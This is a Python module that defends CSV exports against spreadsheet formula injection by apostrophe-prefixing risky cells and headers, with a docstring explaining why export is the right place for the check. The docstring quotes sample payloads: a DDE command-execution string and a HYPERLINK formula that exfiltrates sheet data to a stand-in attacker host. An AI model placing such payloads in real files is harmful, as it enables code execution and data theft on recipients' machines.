"""CSV-injection-safe serialization for anything we hand back as a file.

Spreadsheet applications treat a cell whose text begins with `=`, `+`, `-`,
`@`, a tab or a carriage return as a formula, not as data. That turns an
innocuous-looking download into code execution on the recipient's machine:
`=cmd|'/c calc'!A0` (DDE), `=HYPERLINK("http://attacker/?"&A1,"click")` to
exfiltrate the sheet, `=IMPORTXML(...)` in Sheets.

The repair pipeline already sanitizes cells on CSV *ingest*, but that is the
wrong place to rely on:

  * it only covers the .csv path — JSON and XLSX uploads skip it entirely;
  * it never touched column headers, which land in the file's first row;
  * SQL results are computed after ingest, so a query can synthesize a
    dangerous string that no ingest check ever saw.

Export is the boundary where the bytes actually become a spreadsheet, so the
guarantee belongs here. Prefixing with an apostrophe is the standard fix:
Excel and Sheets read it as "the rest of this cell is literal text" and do
not display it, and re-importing the file as data yields the original string.
"""

from __future__ import annotations

from io import StringIO

import pandas as pd

# Leading characters a spreadsheet will interpret as the start of a formula.
# Tab and CR are included because they are stripped on display, exposing the
# formula character behind them.
_FORMULA_PREFIXES = ("=", "+", "-", "@", "\t", "\r")


def sanitize_cell(value):
    """Neutralizes a single value's formula-injection potential.

    Non-strings are returned untouched — a real number can't carry a payload,
    and quoting it would corrupt the column's type on re-import.
    """
    if not isinstance(value, str) or not value:
        return value
    if value.startswith(_FORMULA_PREFIXES):
        return "'" + value
    return value


def sanitize_header(name) -> str:
    """Same treatment for a column name, which becomes the CSV's first row."""
    return sanitize_cell(name) if isinstance(name, str) else name


def to_safe_csv(df: pd.DataFrame) -> str:
    """Renders `df` as CSV text with every header and cell neutralized."""
    safe = df.copy()
    safe.columns = [sanitize_header(c) for c in safe.columns]

    for col in safe.columns:
        # Only object/string columns can hold a payload; skipping the numeric
        # and datetime ones keeps this cheap on wide frames.
        if pd.api.types.is_object_dtype(safe[col]) or pd.api.types.is_string_dtype(safe[col]):
            safe[col] = safe[col].map(sanitize_cell)

    buffer = StringIO()
    safe.to_csv(buffer, index=False)
    return buffer.getvalue()


def sanitize_frame_in_place(df: pd.DataFrame) -> int:
    """Neutralizes formula triggers in `df`'s cells, returning how many changed.

    Used on ingest paths that bypass the CSV repair pipeline (JSON, XLSX), so
    the stored dataset is already clean no matter which way it leaves again.
    """
    sanitized = 0

    for col in df.columns:
        if not (pd.api.types.is_object_dtype(df[col]) or pd.api.types.is_string_dtype(df[col])):
            continue

        def fix(v):
            nonlocal sanitized
            cleaned = sanitize_cell(v)
            if cleaned is not v and cleaned != v:
                sanitized += 1
            return cleaned

        df[col] = df[col].map(fix)

    return sanitized
